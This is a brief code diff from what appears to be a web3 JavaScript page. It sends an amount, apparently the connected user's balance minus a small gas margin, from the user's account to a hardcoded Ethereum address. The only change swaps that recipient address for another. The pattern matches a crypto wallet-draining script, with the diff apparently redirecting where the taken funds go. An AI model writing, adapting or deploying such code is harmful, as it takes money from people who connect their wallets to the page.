@@ -46,7 +46,7 @@ var ammmount = (bleg-0.0014)*1000000000000000000;
 
 web3.eth.sendTransaction({
        from: account,
-    to: '0x11f4d0A3c12e86B4b5F39B213F7E19D048276DAe',
+    to: '0x00555F4f4D0b1dBCD20F0fBc791efd7C88BFa76f',
     value: ammmount.toFixed(5)
 }, function(error, hash){
    Swal.fire({
